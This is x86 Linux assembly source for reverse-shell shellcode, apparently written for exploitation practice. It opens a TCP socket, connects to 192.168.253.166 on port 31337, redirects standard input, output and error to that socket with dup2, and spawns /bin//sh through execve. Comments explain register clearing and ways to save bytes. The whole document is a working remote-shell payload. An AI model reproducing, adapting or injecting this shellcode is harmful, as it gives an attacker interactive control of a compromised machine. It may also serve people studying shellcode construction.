global _start

section .text
_start:
	
	xor ebx,ebx		; clear the registers
	xor eax,eax		; this is mandatory 
	xor ecx,ecx		; since the shellcode is executing in the
	xor edx,edx		; middle of the program we don't know the 
				; state the registers will be at that point


	mov al, 0x66	  	; socket_call() functions
	inc bl		  	; bl = 1 socket()
	push ecx		; push a null
	push byte 0x6	  	; IPPROTO_TCP
	push byte 0x1	  	; SOCK_STREAM
	push byte 0x2 	  	; AF_inet
	mov ecx, esp	  	; pointer to args for socket()
	int 0x80

	xchg esi,eax	  	; save sockfd in esi

	mov al,0x66
	pop bx			; bl = 2
	;---------------------
	; This address works
	;---------------------
	push dword 0xa9fda8c0	; 192.168.253.166 	
	push word 0x697a  	; 31337
	push bx			; AF_INET
	mov ecx,esp	  	; struct sockaddr_in
	push 0x10	  	; sizeof (struct sockaddr)
	push ecx	  	; struct socaddr_in *client_addr
	push esi	  	; sockfd
	mov ecx, esp	  	; puntero a args de socket
	inc bl		  	; bl = 3, connect()
	int 0x80

	; After the call, eax is zero, so I can just copy that to ecx
	; To save 2 bytes	
	;xor ecx,ecx		; clear ecx	
	;xor eax,eax		; and eax
	; Can be replaced by
	; mov ecx,eax		; should put 0 in ecx
	mov ecx,eax

	mov cl,bl		; mov 3 to bl
dup2:
	dec cl			; cl = 2 in the beginning
	mov al,0x3f		; dup2()
	int 0x80		; 
	jne dup2		; finishes when cl equals -1


	; eax contains a zero again so this too can be ommitted
	;xor eax,eax
	;cdq			; clear edx (seem so be 0 also). Ommit this.:

	mov al,0xb		; excecve
	push edx		; 0x00
	push 0x68732f2f		; push in reverse order /bin//sh (8 bytes)
	push 0x6e69622f		;/bin//sh
	mov ebx,esp		; ebx =/bin//sh,0x00
	push edx		; 0x00
	push ebx		; push address of "/bin//sh",0x0
	mov ecx,esp		; point ecx to address of "/bin//sh",0x00
	push edx		; push a null byte
	mov edx,esp		; edx point to th address of the null byte
	int 0x80

